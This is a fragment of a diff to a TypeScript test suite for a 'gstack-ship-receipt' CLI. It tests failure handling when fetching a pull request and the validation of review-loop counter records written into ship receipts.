+    expect(editFailed.out.trim()).toBe('GSTACK_RESULT: skill=ship status=incomplete run=-');
+    expect(fs.existsSync(runDir)).toBe(false);
+    const jsonFail = runBin(repo, 'gstack-ship-receipt', ['carry', '--pr', '8', '--out', runDir, '--json'], env);
+    expect(jsonFail.status).toBe(EXIT.fail);
+    expect(JSON.parse(jsonFail.out)).toMatchObject({ skill: 'ship', status: 'incomplete', run: '-' });
+    // gh pr view fails: incomplete, not refused
+    fs.rmSync(prJson);
+    const viewFailed = runBin(repo, 'gstack-ship-receipt', ['carry', '--pr', '8', '--out', runDir], env);
+    expect(viewFailed.status).toBe(EXIT.fail);
+    expect(viewFailed.err).toContain('gh pr view failed: gh: HTTP 502');
+    expect(viewFailed.out.trim()).toBe('GSTACK_RESULT: skill=ship status=incomplete run=-');
+    expect(fs.existsSync(runDir)).toBe(false);
+  });
+});
+
+describe('review_loop receipt input (harness lane E: the factory scorecard counters)', () => {
+  // Generated by /ship Step 7 (coverage audit of the harness lane E diff).
+  // Value: protects=the receipt's review_loop carries only well-formed non-negative integer counters, and `write --review-loop`
+  // refuses a malformed record instead of silently dropping it from the receipt the scorecard reads; fails_when=parseReviewLoop
+  // accepts a float, a negative or a string count, or write ignores a bad --review-loop and writes the body anyway; why_new=the
+  // write test covers one valid record only; seam=none; no_claim=none beyond protects
+  // Moved out of the heavy write test above by /ship Step 7: with the loop case appended there, that test ran 4.8–5.0 s on a
+  // 4-core machine and tripped bun's 5 s per-test default about every other run; the loop case needs no stamped tree receipt.
+  test('write --review-loop records the loop counters in the receipt and the SHIP_RECEIPT line', () => {
+    const repo = fixture();
+    const loopFile = path.join(repo.root, 'review-loop.json');
+    fs.writeFileSync(loopFile, JSON.stringify({ passes: 2, blocking_found: 1, deferred: 1, noted: 3, fixed: 1, scope: 'frozen' }));
+    const loopBody = path.join(repo.root, 'body-loop.md');
+    fs.writeFileSync(loopBody, '## Summary\n');
+    const withLoop = runBin(repo, 'gstack-ship-receipt', ['write', '--pr', '42', '--base', 'main', '--gate', '{"tests":{"pass":1,"fail":0,"skip":0}}',
+      '--session-kind', 'unattended', '--queue-mode', 'stamp-at-merge', '--history', 'squash-ok', '--review-loop', '@' + loopFile, '--body', loopBody]);
+    expect(withLoop.status).toBe(EXIT.ok);
+    expect(withLoop.err.trim()).toContain(' passes=2 blocking_found=1 deferred=1');
+    expect(extractReceipt(withLoop.out).receipt).toMatchObject({ pr: 42, review_loop: { passes: 2, blocking_found: 1, deferred: 1, noted: 3, fixed: 1, scope: 'frozen' } });
+    const written = extractReceipt(fs.readFileSync(loopBody, 'utf8'));
+    expect(written.errors).toEqual([]);
+    expect(Object.keys(written.receipt!).slice(-1)).toEqual(['review_loop']);
+  });
+
+  test('parseReviewLoop keeps integer counters and drops the rest; write --review-loop refuses a malformed record and writes nothing', () => {
+    expect(parseReviewLoop({ passes: 2, blocking_found: 1, deferred: 1 })).toEqual({ passes: 2, blocking_found: 1, deferred: 1 });
+    expect(parseReviewLoop({ passes: 2, blocking_found: 1, deferred: 1, noted: 3, fixed: 1, scope: 'frozen', extra: 'x' })).toEqual({ passes: 2, blocking_found: 1, deferred: 1, noted: 3, fixed: 1, scope: 'frozen' });
+    expect(parseReviewLoop({ passes: 2, blocking_found: 1, deferred: 1, noted: -1, fixed: 1.5, scope: 'x'.repeat(40) })).toEqual({ passes: 2, blocking_found: 1, deferred: 1, scope: 'x'.repeat(20) });
+    expect(parseReviewLoop({ passes: 0, blocking_found: 0, deferred: 0 })).toEqual({ passes: 0, blocking_found: 0, deferred: 0 });
+    for (const bad of [undefined, null, 'frozen', [], { passes: 2, blocking_found: 1 }, { passes: '2', blocking_found: 1, deferred: 1 }, { passes: 1.5, blocking_found: 1, deferred: 1 }, { passes: -1, blocking_found: 1, deferred: 1 }]) {
+      expect(parseReviewLoop(bad)).toBeUndefined();
+    }
+    expect(receiptSummaryLine({ schema_version: 1, head: HEAD, base: 'main', review_loop: { passes: '2', blocking_found: 1, deferred: 1 } } as any)).not.toContain('passes=');
+    const repo = fixture();
+    const body = path.join(repo.root, 'body.md');
+    fs.writeFileSync(body, 'prose\n');
+    const r = runBin(repo, 'gstack-ship-receipt', ['write', '--pr', '7', '--base', 'main', '--session-kind', 'x', '--review-loop', '{"passes":"2","blocking_found":1,"deferred":1}', '--body', body]);
+    expect(r.status).toBe(EXIT.usage);
+    expect(r.err).toContain('--review-loop needs integer passes, blocking_found and deferred');
+    expect(r.out).toBe('');
+    expect(fs.readFileSync(body, 'utf8')).toBe('prose\n');
   });
 });
 
